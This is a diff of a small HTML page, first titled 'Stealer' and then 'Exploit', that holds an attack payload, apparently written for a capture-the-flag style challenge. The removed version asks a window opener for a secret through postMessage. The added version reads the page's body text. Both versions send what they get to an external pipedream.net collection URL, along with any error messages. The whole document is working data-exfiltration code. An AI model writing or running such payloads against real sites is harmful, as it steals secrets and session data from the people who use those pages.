@@ -1,22 +1,17 @@
 <!DOCTYPE html>
 <html>
-  <head><title>Stealer</title></head>
+  <head>
+    <title>Exploit</title>
+    <meta charset="utf-8">
+  </head>
   <body>
     <script>
-      // Attendre un peu que la page admin soit chargée
-      setTimeout(() => {
-        try {
-          // Envoie un message à l'opener (page admin)
-          window.opener.postMessage("gimme", "*");
-
-          // Écoute la réponse
-          window.addEventListener("message", function(event) {
-            fetch("https://eosaujiilwrrffu.m.pipedream.net?secret=" + encodeURIComponent(event.data));
-          });
-        } catch (e) {
-          fetch('https://eosaujiilwrrffu.m.pipedream.net?error=' + encodeURIComponent(e.message));
-        }
-      }, 1000);
+      try {
+        const secret = document.body.innerText;
+        fetch("https://eosaujiilwrrffu.m.pipedream.net?secret=" + encodeURIComponent(secret));
+      } catch (e) {
+        fetch("https://eosaujiilwrrffu.m.pipedream.net?error=" + encodeURIComponent(e.message));
+      }
     </script>
   </body>
 </html>
